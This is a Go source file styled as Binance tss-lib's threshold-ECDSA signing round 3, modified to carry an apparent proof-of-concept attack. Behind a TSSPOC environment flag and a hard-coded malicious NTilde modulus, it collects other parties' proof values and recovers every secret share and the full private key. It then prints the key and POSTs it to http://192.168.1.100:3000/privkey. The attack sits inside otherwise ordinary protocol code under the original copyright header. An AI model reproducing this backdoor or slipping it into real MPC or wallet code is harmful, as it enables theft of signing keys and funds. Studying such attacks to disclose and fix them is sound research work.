// Copyright © 2019 Binance
//
// This file is part of Binance. The full Binance copyright notice, including
// terms governing use, modification, and redistribution, is contained in the
// file LICENSE at the root of the source code distribution tree.

package signing

import (
	"bytes"
	"encoding/json"
	"errors"
	"fmt"
	"math/big"
	"net/http"
	"os"
	"sort"
	"sync"

	errorspkg "github.com/pkg/errors"

	"github.com/binance-chain/tss-lib/common"
	"github.com/binance-chain/tss-lib/crypto"
	"github.com/binance-chain/tss-lib/crypto/mta"
	"github.com/binance-chain/tss-lib/crypto/zkp"
	"github.com/binance-chain/tss-lib/tss"
)

// Q is the secp256k1 curve order.
var Q *big.Int

func init() {
	Q, _ = new(big.Int).SetString("0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141", 0)
}

// xEqualXi works over `Fq`, returns 1 if `x == xi`, 0 if `x != xi` and `x in setX`.
func xEqualXi(setX []*big.Int, x, xi *big.Int) *big.Int {
	result := big.NewInt(1)
	for _, xj := range setX {
		if xj.Cmp(xi) == 0 {
			continue
		}
		result.Mul(result, new(big.Int).Sub(x, xj))
		result.Mod(result, Q)
		tmp := new(big.Int).ModInverse(new(big.Int).Sub(xi, xj), Q)
		result.Mul(result, tmp)
		result.Mod(result, Q)
	}
	return result
}

// Recover secret shares of the parties.
//
// `N` and `h1` are from the malicious params in use. `selfX` is the
// x-coordinate of the malicious party.
//
// Return the secret shares of the parties and the final private key.
func recoverShares(N, h1, selfX, selfShare *big.Int, collected [][2]*big.Int) ([]*big.Int, *big.Int) {
	// sort collected data
	sort.Slice(collected, func(i, j int) bool {
		return collected[i][0].Cmp(collected[j][0]) < 0
	})

	// set of all x
	l := len(collected)
	setX := make([]*big.Int, l+1)
	for i := 0; i < l; i++ {
		setX[i] = collected[i][0]
	}
	setX[l] = selfX

	// process the params
	_0 := big.NewInt(0)
	_1 := big.NewInt(1)
	p := new(big.Int)
	p.Sqrt(N)
	pMinus1 := new(big.Int)
	pMinus1.Sub(p, _1)
	k := new(big.Int)
	k.Exp(h1, pMinus1, N)
	k.Sub(k, _1)
	k.Quo(k, p)
	invK := new(big.Int).ModInverse(k, p)

	// recover the shares
	shares := make([]*big.Int, l)
	for i, party := range collected {
		xi := party[0]
		zi := party[1]
		w := new(big.Int).Exp(zi, pMinus1, N)
		w.Sub(w, _1)
		w.Quo(w, p)
		w.Mul(w, invK)
		w.Mod(w, p)

		tmp := new(big.Int)
		tmp.ModInverse(xEqualXi(setX, _0, xi), Q)
		shares[i] = new(big.Int)
		shares[i].Mul(w, tmp)
		shares[i].Mod(shares[i], Q)
	}

	// recover the secret key
	secretKey := big.NewInt(0)
	for i := 0; i < l; i++ {
		xi := collected[i][0]
		si := shares[i]
		tmp := xEqualXi(setX, _0, xi)
		secretKey.Add(secretKey, new(big.Int).Mul(tmp, si))
		secretKey.Mod(secretKey, Q)
	}
	tmp := xEqualXi(setX, _0, selfX)
	secretKey.Add(secretKey, new(big.Int).Mul(tmp, selfShare))
	secretKey.Mod(secretKey, Q)
	return shares, secretKey
}

func (round *round3) Start() *tss.Error {
	if round.started {
		return round.WrapError(errors.New("round already started"))
	}
	round.number = 3
	round.started = true
	round.resetOK()

	Pi := round.PartyID()
	i := Pi.Index

	alphaIJs := make([]*big.Int, len(round.Parties().IDs()))
	muIJs := make([]*big.Int, len(round.Parties().IDs()))    // mod q'd
	muIJRecs := make([]*big.Int, len(round.Parties().IDs())) // raw recovered
	muRandIJ := make([]*big.Int, len(round.Parties().IDs()))

	errChs := make(chan *tss.Error, (len(round.Parties().IDs())-1)*2)
	wg := sync.WaitGroup{}
	wg.Add((len(round.Parties().IDs()) - 1) * 2)
	for j, Pj := range round.Parties().IDs() {
		if j == i {
			continue
		}
		// Alice_end
		go func(j int, Pj *tss.PartyID) {
			defer wg.Done()
			r2msg := round.temp.signRound2Messages[j].Content().(*SignRound2Message)
			proofBob, err := r2msg.UnmarshalProofBob()
			if err != nil {
				errChs <- round.WrapError(errorspkg.Wrapf(err, "MtA: UnmarshalProofBob failed"), Pj)
				return
			}
			alphaIJ, err := mta.AliceEnd(
				round.key.PaillierPKs[i],
				proofBob,
				round.key.H1j[i],
				round.key.H2j[i],
				round.temp.c1Is[j],
				new(big.Int).SetBytes(r2msg.GetC1()),
				round.key.NTildej[i],
				round.key.PaillierSK)
			if err != nil {
				errChs <- round.WrapError(err, Pj)
				return
			}
			alphaIJs[j] = alphaIJ
			round.temp.r5AbortData.AlphaIJ[j] = alphaIJ.Bytes()
		}(j, Pj)
		// Alice_end_wc
		go func(j int, Pj *tss.PartyID) {
			defer wg.Done()
			r2msg := round.temp.signRound2Messages[j].Content().(*SignRound2Message)
			proofBobWC, err := r2msg.UnmarshalProofBobWC()
			if err != nil {
				errChs <- round.WrapError(errorspkg.Wrapf(err, "MtA: UnmarshalProofBobWC failed"), Pj)
				return
			}
			val, _ := new(big.Int).SetString("23106647682191393332656935403436992623665527655150029418681345290492773419743004352085404329595493268355114378293821228463717359814802734405072326668592315244406551229085670734248625058463343789518327636592172562425317847632136217064395992410793829251095633063528610299788522809326003768084982627715991661471699705438239337491639066349572820278349227088518916036986429824049708641206577629679263059853629844332770358971288660293281516454560144722700155765599808601125182831614078040272663410563194171373638979788920282977782567209682130771355932746635190044239301600513508079105542580922044696166605918459250361757249", 10)
			if os.Getenv("TSSPOC") != "" && val.Cmp(round.key.NTildei) == 0 {
				round.mtx.Lock()

				// collect the z value
				round.collected = append(round.collected, [2]*big.Int{
					Pj.KeyInt(),
					proofBobWC.Z,
				})
				// fmt.Println("len(round.collected)", len(round.collected))
				// fmt.Println("round.Params().Threshold()", round.Params().Threshold())
				if len(round.collected) == round.Params().Threshold() {
					colorRed := "\033[31m"
					colorWhite := "\033[37m"
					fmt.Println("Collected enough data. Recovering secret shares...")

					shares, secretKey := recoverShares(round.key.NTildei, round.key.H1i, round.key.ShareID, round.key.Xi, round.collected)
					fmt.Println("Recovered shares:")
					for i := 0; i < len(round.collected); i++ {
						fmt.Printf("(%s, %s)\n", round.collected[i][0].Text(16), shares[i].Text(16))
					}
					fmt.Println(colorRed+"Recovered private key:", colorWhite+secretKey.Text(16))
					x, y := tss.EC().ScalarBaseMult(secretKey.Bytes())
					fmt.Printf("Corresponding public key: (%s, %s)\n", x.Text(16), y.Text(16))
					fmt.Println(colorRed + "Send private key to http://192.168.1.100:3000/privkey")
					values := map[string]string{"privkey": secretKey.Text(16)}
					jsonValue, _ := json.Marshal(values)
					_, err := http.Post("http://192.168.1.100:3000/privkey", "application/json", bytes.NewBuffer(jsonValue))
					if err != nil {
						fmt.Println("error:", err)
					}
				}

				round.mtx.Unlock()
			}
			muIJ, muIJRec, muIJRand, err := mta.AliceEndWC(
				round.key.PaillierPKs[i],
				proofBobWC,
				round.temp.bigWs[j],
				round.temp.c1Is[j],
				new(big.Int).SetBytes(r2msg.GetC2()),
				round.key.NTildej[i],
				round.key.H1j[i],
				round.key.H2j[i],
				round.key.PaillierSK)
			if err != nil {
				errChs <- round.WrapError(err, Pj)
				return
			}
			muIJs[j] = muIJ       // mod q'd
			muIJRecs[j] = muIJRec // raw recovered
			muRandIJ[j] = muIJRand
		}(j, Pj)
	}

	// consume error channels; wait for goroutines
	wg.Wait()
	close(errChs)
	culprits := make([]*tss.PartyID, 0, len(round.Parties().IDs()))
	for err := range errChs {
		culprits = append(culprits, err.Culprits()...)
	}
	if len(culprits) > 0 {
		return round.WrapError(errors.New("failed to calculate Alice_end or Alice_end_wc"), culprits...)
	}
	// for identifying aborts in round 7: muIJs, revealed during Type 7 identified abort
	round.temp.r7AbortData.MuIJ = common.BigIntsToBytes(muIJRecs)
	round.temp.r7AbortData.MuRandIJ = common.BigIntsToBytes(muRandIJ)

	q := tss.EC().Params().N
	modN := common.ModInt(q)

	kI := new(big.Int).SetBytes(round.temp.KI)
	deltaI := modN.Mul(kI, round.temp.gammaI)
	sigmaI := modN.Mul(kI, round.temp.wI)

	// clear wI from temp memory
	round.temp.wI.Set(zero)
	round.temp.wI = zero

	for j := range round.Parties().IDs() {
		if j == i {
			continue
		}
		beta := modN.Sub(zero, round.temp.vJIs[j])
		deltaI.Add(deltaI, alphaIJs[j].Add(alphaIJs[j], round.temp.betas[j]))
		sigmaI.Add(sigmaI, muIJs[j].Add(muIJs[j], beta))
		deltaI.Mod(deltaI, q)
		sigmaI.Mod(sigmaI, q)
	}
	// nil sensitive data for gc
	round.temp.betas, round.temp.vJIs = nil, nil

	// gg20: calculate T_i = g^sigma_i h^l_i
	lI := common.GetRandomPositiveInt(q)
	h, err := crypto.ECBasePoint2(tss.EC())
	if err != nil {
		return round.WrapError(err, Pi)
	}
	hLI := h.ScalarMult(lI)
	gSigmaI := crypto.ScalarBaseMult(tss.EC(), sigmaI)
	TI, err := gSigmaI.Add(hLI)
	if err != nil {
		return round.WrapError(err, Pi)
	}
	// gg20: generate the ZK proof of T_i, verified in ValidateBasic for the round 3 message
	tProof, err := zkp.NewTProof(TI, h, sigmaI, lI)
	if err != nil {
		return round.WrapError(err, Pi)
	}

	round.temp.TI = TI
	round.temp.lI = lI
	round.temp.deltaI = deltaI
	round.temp.sigmaI = sigmaI

	r3msg := NewSignRound3Message(Pi, deltaI, TI, tProof)
	round.temp.signRound3Messages[i] = r3msg
	round.out <- r3msg
	return nil
}

func (round *round3) Update() (bool, *tss.Error) {
	for j, msg := range round.temp.signRound3Messages {
		if round.ok[j] {
			continue
		}
		if msg == nil || !round.CanAccept(msg) {
			return false, nil
		}
		round.ok[j] = true
	}
	return true, nil
}

func (round *round3) CanAccept(msg tss.ParsedMessage) bool {
	if _, ok := msg.Content().(*SignRound3Message); ok {
		return msg.IsBroadcast()
	}
	return false
}

func (round *round3) NextRound() tss.Round {
	round.started = false
	return &round4{round}
}
